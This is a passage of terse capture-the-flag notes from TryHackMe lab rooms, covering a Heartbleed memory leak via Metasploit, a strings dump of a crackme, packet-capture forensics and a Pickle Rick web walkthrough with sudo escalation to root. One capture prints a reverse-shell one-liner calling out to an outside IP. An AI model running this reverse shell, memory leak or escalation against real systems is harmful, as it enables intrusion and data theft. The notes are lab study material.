[*] 10.10.142.176:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > sert verbose true
^CInterrupt: use the 'exit' command to quit
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true
verbose => true
msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run

[*] 10.10.142.176:443     - Leaking heartbeat response #1
[*] 10.10.142.176:443     - Sending Client Hello...
[*] 10.10.142.176:443     - SSL record #1:
[*] 10.10.142.176:443     -     Type:    22
[*] 10.10.142.176:443     -     Version: 0x0301
[*] 10.10.142.176:443     -     Length:  86
[*] 10.10.142.176:443     -     Handshake #1:
[*] 10.10.142.176:443     -             Length: 82
[*] 10.10.142.176:443     -             Type:   Server Hello (2)
[*] 10.10.142.176:443     -             Server Hello Version:           0x0301
[*] 10.10.142.176:443     -             Server Hello random data:       1341c36f15f46bda60f64c71c4421f51e4c3607261aba3909e7dba1132e0744f
[*] 10.10.142.176:443     -             Server Hello Session ID length: 32
[*] 10.10.142.176:443     -             Server Hello Session ID:        5fa5c8ca7543200e1921bd24b90ab2631fa485925840dedd9b877b286fca8fcb
[*] 10.10.142.176:443     - SSL record #2:
[*] 10.10.142.176:443     -     Type:    22
[*] 10.10.142.176:443     -     Version: 0x0301
[*] 10.10.142.176:443     -     Length:  951
[*] 10.10.142.176:443     -     Handshake #1:
[*] 10.10.142.176:443     -             Length: 947
[*] 10.10.142.176:443     -             Type:   Certificate Data (11)
[*] 10.10.142.176:443     -             Certificates length: 944
[*] 10.10.142.176:443     -             Data length: 947
[*] 10.10.142.176:443     -             Certificate #1:
[*] 10.10.142.176:443     -                     Certificate #1: Length: 941
[*] 10.10.142.176:443     -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, issuer=#<OpenSSL::X509::Name CN=localhost,OU=TryHackMe,O=TryHackMe,L=London,ST=London,C=UK>, serial=#<OpenSSL::BN:0x00007f8b104dd7b0>, not_before=2019-02-16 10:41:14 UTC, not_after=2020-02-16 10:41:14 UTC>
[*] 10.10.142.176:443     - SSL record #3:
[*] 10.10.142.176:443     -     Type:    22
[*] 10.10.142.176:443     -     Version: 0x0301
[*] 10.10.142.176:443     -     Length:  331
[*] 10.10.142.176:443     -     Handshake #1:
[*] 10.10.142.176:443     -             Length: 327
[*] 10.10.142.176:443     -             Type:   Server Key Exchange (12)
[*] 10.10.142.176:443     - SSL record #4:
[*] 10.10.142.176:443     -     Type:    22
[*] 10.10.142.176:443     -     Version: 0x0301
[*] 10.10.142.176:443     -     Length:  4
[*] 10.10.142.176:443     -     Handshake #1:
[*] 10.10.142.176:443     -             Length: 0
[*] 10.10.142.176:443     -             Type:   Server Hello Done (14)
[*] 10.10.142.176:443     - Sending Heartbeat...
[*] 10.10.142.176:443     - Heartbeat response, 65535 bytes
[+] 10.10.142.176:443     - Heartbeat response with leak, 65535 bytes
[*] 10.10.142.176:443     - Printable info leaked:
......^.-..N......q.$.%....YLLkI..)gy...f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36..Content-Length: 75..Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_message=THM{sSl-Is-BaD}.....0..f.:u._..................................................................................................................................... repeated 15751 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@.....................A.....@..m0'.`..;Tx.>8.sk..&.x...,h.....\=.'....p.f...C...:.L..'....}j.4,.......5I.z3.A/......v\.........uaJ.......n.`B....u.@.|...7t*..............E......x/..h..".a.>A..CH.yQ.`..E2.D.U..*i9$..@./?....MxxE.#WA...N....I.b{..y.-.}.2....{.Y..b4[...&2.K.F.4...._.........1_<UI........&f3..R....v...D.I&...,..+.}....i...b..^+J..O..OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....M...I...A...V.1...._8.[.u.j.V.5F......N..\|Y...LY.......W#.......#u......~......P.v..<.U..J?D........7.u...'.s.&Wo..<..U.......}..Y......d.*~...Dw.....k6w....Q.U....n..2.i...<.Wv.....].4..#...<+6o.....*.U>&rLL].\...V&.U..Bm.2u..S.wW QJ0....-....m5.|..,O&C..........8.=#.)TRG...M.......C....{L....^...g...LF..B...R.......F...Q..=Db-0.&..................................................................................................................................... repeated 2451 times .....................................................................................................................................@..........V...R..K...o.n..q... ...Qz..H.....G*... e.-....1r=...t..cZ...w....\.N{m...............................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A.....C...`i...'-..R0.../h.. 3...:$..~.h....m....)<.]..0..../..,....T.....kC.S.1e....A..D$.....W..O..da....z...|....~..].......?n...r.J.g.(]2..?.M..m9.{....F........."....H...I....=.;.z.9@.N^..".....@....E.'*.,.Pi.....'._..M..-....;a.4.N......s...L...].......(.2.Q..=....E#...t.:i.......@.$a=mba.G..x...f+3PD..n.JC..................................................................................................................................... repeated 9876 times .....................................................................................................................................@..................................................................................................................................... repeated 175 times ..................................................................................................................................... X...... X...........Hb..}<.8.Ho....b...z..F~J....@....... ..0...............................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....M...I...A...V.1...._8.[.u.j.V.5F......N..\|Y...LY.......W#.......#u......~......P.v..<.U..J?D........7.u...'.s.&Wo..<..U.......}..Y......d.*~...Dw.....k6w....Q.U....n..2.i...<.Wv.....].4..#...<+6o.....*.U>&rLL].\...V&.U..Bm.2u..S.wW QJ0....-....m5.|..,O&C..........8.=#.)TRG...M.......C....{L....^...g...LF..B...R.......F...Q..=Db-0.&..................................................................................................................................... repeated 2451 times .....................................................................................................................................@..........V...R...A.o..k.`.Lq.B.Q..`ra....}..2.tO _...uC ..!.$...c....X@....{(o.................................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A.....@..m0'.`..;Tx.>8.sk..&.x...,h.....\=.'....p.f...C...:.L..'....}j.4,.......5I.z3.A/......v\.........uaJ.......n.`B....u.@.|...7t*..............E......x/..h..".a.>A..CH.yQ.`..E2.D.U..*i9$..@./?....MxxE.#WA...N....I.b{..y.-.}.2....{.Y..b4[...&2.K.F.4...._.........1_<UI........&f3..R....v...D.I&...,..+.}....i...b..^+J..O..................................................................................................................................... repeated 10183 times .....................................................................................................................................
[*] 10.10.142.176:443     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# [Task 8] [Scripting] [Hard] Encrypted Server Chit Chat
```
Todo
```

# [Task 9] [Reverse Engineering] [Easy] Char-Array
```
root@kali:~# strings char-array
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
__cxa_finalize
strcmp
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
=y
=9
52
AWAVI
AUATL
[]A\A]A^A_
enter password
password is correct
password is incorrect
THM{bAsIc-rE}
;*3$"
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
strings.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
root@kali:~#
```

# [Task 12] [Forensics] [Easy] *Sniff* *Sniff*
## challenge 1
```
ftp 
220 Microsoft FTP Service
USER garry
331 Password required for garry.
PASS n00n3willgu3ssM3
530 User cannot log in.
SYST
215 Windows_NT

http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 34
Pragma: no-cache
Cache-control: no-cache
Connection: keep-alive

. ......2.......k... .....-(.....-GET /R/A1QKIEJBNTdEODFGNEQzOTQ5MUY5QzY4REE4ODgyODQwQUY4EgQEFwIZGJABIgEAKgcIBBDTruJrMgoIABC7r-JrGIACOICAnJABSICAgID6_____wE= HTTP/1.1
Host: su.ff.avast.com
Accept: */*
Content-Type: application/octet-stream
Pragma: no-cache
Connection: keep-alive

static
conversation
22

```

## cha2
```
GET / HTTP/1.1
Accept-Encoding: gzip,deflate
Host: neverssl.com
Accept: */*
User-Agent: sqlmap/1.2.10#stable (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

udp.stream eq 3
nT. .........spring.fyi.......)........nT...........spring.fyi..............,.EDgoogle-site-verification=WMBBba98G8g-InYNw_4JYu2QzKc7pV7DD8aNzDBISoM.........,.$#v=spf1 include:_spf.google.com ~all.........,.-,YzYzZGY3ZDcwOTE2MmZjMGM2NmJhODdlNTVlZjkwMGQ=..)........

```

## cha3
```
dns
Frame 2: 134 bytes on wire (1072 bits), 134 bytes captured (1072 bits) on interface en0, id 1
Ethernet II, Src: Sagemcom_9d:61:0a (d8:7d:7f:9d:61:0a), Dst: Apple_cf:19:37 (98:01:a7:cf:19:37)
Internet Protocol Version 4, Src: 1.1.1.1, Dst: 192.168.1.164
User Datagram Protocol, Src Port: 53, Dst Port: 61750
Domain Name System (response)
    Transaction ID: 0x4b08
    Flags: 0x8180 Standard query response, No error
    Questions: 1
    Answer RRs: 1
    Authority RRs: 0
    Additional RRs: 1
    Queries
    Answers
        altrader.net: type TXT, class IN
            Name: altrader.net
            Type: TXT (Text strings) (16)
            Class: IN (0x0001)
            Time to live: 202 (3 minutes, 22 seconds)
            Data length: 39
            TXT Length: 38
            TXT: bash -i >& /dev/tcp/172.1.0.43/80 0>&1
    Additional records
    [Request In: 1]
    [Time: 0.017352000 seconds]

port scan
nmap
```

## cha4
```
```


# [Task 17] [Web Exploitation] [Easy] Pickle Rick


# toppage
```html
    Note to self, remember username!

    Username: R1ckRul3s
```
## robot
this is password
```
Wubbalubbadubdub

```
http://10.10.188.111/assets/
```html
<html>
 <head>
  <title>Index of /assets</title>
 </head>
 <body>
<h1>Index of /assets</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="bootstrap.min.css">bootstrap.min.css</a></td><td align="right">2019-02-10 16:37  </td><td align="right">119K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="bootstrap.min.js">bootstrap.min.js</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 37K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="fail.gif">fail.gif</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 49K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="jquery.min.js">jquery.min.js</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 85K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="picklerick.gif">picklerick.gif</a></td><td align="right">2019-02-10 16:37  </td><td align="right">222K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="portal.jpg">portal.jpg</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 50K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="rickandmorty.jpeg">rickandmorty.jpeg</a></td><td align="right">2019-02-10 16:37  </td><td align="right">488K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.188.111 Port 80</address>
</body></html>

```

## nikto
```
root@kali:~# nikto -h 10.10.188.111
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.188.111
+ Target Hostname:    10.10.188.111
+ Target Port:        80
+ Start Time:         2020-05-17 01:13:55 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-05-17 01:14:45 (GMT0) (50 seconds)
---------------------------------------------------------------------------
```

## gobuster
```
root@kali:~# gobuster dir -u http://10.10.188.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.188.111
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/05/17 01:21:47 Starting gobuster
===============================================================
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/denied.php (Status: 302)
/server-status (Status: 403)
/clue.txt (Status: 200)
===============================================================
2020/05/17 01:25:18 Finished
===============================================================
```
## flag1
http://10.10.188.111/portal.php
```
ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

cat Sup3rS3cretPickl3Ingred.txt
none

less Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair




```

## flag2
```
ls /home/rick -al
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients

less "/home/rick/second ingredients"
1 jerry tear
```

## flag3
```
sudo -l
Matching Defaults entries for www-data on ip-10-10-188-111.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-188-111.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

sudo ls /root -al
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 May 17 01:09 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap

sudo less /root/3rd.txt
3rd ingredients: fleeb juice
```

